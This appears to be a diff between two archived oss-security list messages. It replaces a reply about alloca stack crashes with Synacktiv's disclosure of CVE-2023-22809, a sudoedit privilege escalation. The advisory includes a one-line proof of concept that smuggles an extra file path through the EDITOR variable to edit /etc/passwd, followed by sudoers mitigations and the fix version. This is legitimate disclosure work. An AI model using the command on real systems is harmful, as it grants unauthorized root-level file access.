@@ -1,30 +1,69 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2023/02/08/2
-Message-ID: <87h6vwqyro.fsf@oldenburg.str.redhat.com>
-Date: Wed, 08 Feb 2023 10:42:19 +0100
-From: Florian Weimer <fweimer@...hat.com>
-To: Georgi Guninski <gguninski@...il.com>
-Cc: oss-security@...ts.openwall.com
-Subject: Re: SEGV in `alloca(BIG)` and `long pl[BIG]`
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2023/01/19/1
+Message-ID: <CAE-GootkXskaRKTmdPg1KsL3cm2oPq8DtL14MoupwX_CaVDeXw@mail.gmail.com>
+Date: Thu, 19 Jan 2023 01:33:43 +0100
+From: Matthieu Barjole <matthieu.barjole@...acktiv.com>
+To: oss-security@...ts.openwall.com
+Subject: CVE-2023-22809: Sudoedit can edit arbitrary files
 Content-Type: text/plain; charset=utf-8
 
-* Georgi Guninski:
+Hello everyone,
 
-> Inline are two C warez, which crash on
-> `alloca(BIG)` and `long pl[BIG]`.
->
-> I think alloca(BIG) should return error if BIG>max_signed_size_t.
-> In C++ `new[BUG]` throws exception and core dumps.
+While auditing Sudo, Synacktiv identified a privilege escalation in sudoedit
+when a user is authorized to use it by the sudoers policy. This
+vulnerability
+was assigned CVE-2023-22809 and affects Sudo versions 1.8.0 through 1.9.12p1
+inclusive.
 
-Unfortunately, alloca cannot report an error, and there is no portable
-way to discover stack boundaries anyway.  With -fstack-clash-protection,
-we could reliably produce crashes, but the feature is somewhat
-incomplete:
+## Analysis
 
-  Integer overflows in dynamically-sized stack allocations with
-  -fstack-clash-protection
-  <https://gcc.gnu.org/bugzilla/show_bug.cgi?id=83697>
+The technical analysis can be found in the following security advisory:
+https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf
 
-Thanks,
-Florian
+## Proof of Concept
+
+Assuming the following sudoers policy:
+
+```
+# cat /etc/sudoers
+user ALL=(ALL:ALL) sudoedit /etc/motd
+[...]
+```
+
+Arbitrary files such as `/etc/passwd` may also be edited as such:
+
+```
+EDITOR='vim -- /etc/passwd' sudoedit /etc/motd
+```
+
+## Mitigation
+
+It is possible to prevent a user-specified editor from being used by
+sudoedit by
+adding the following line to the sudoers file.
+
+```
+Defaults!sudoedit   env_delete+="SUDO_EDITOR VISUAL EDITOR"
+```
+
+To restrict the editor when editing specific files, a Cmnd_Alias can be
+used,
+for example:
+
+```
+Cmnd_Alias          EDIT_MOTD = sudoedit /etc/motd
+Defaults!EDIT_MOTD  env_delete+="SUDO_EDITOR VISUAL EDITOR"
+user                ALL = EDIT_MOTD
+```
+
+## Fix
+
+The issue was fixed in Sudo 1.9.12.p2.
+
+## References
+
+[1]
+https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf
+[2] https://www.sudo.ws/security/advisories/sudoedit_any/
+[3] https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-22809
 
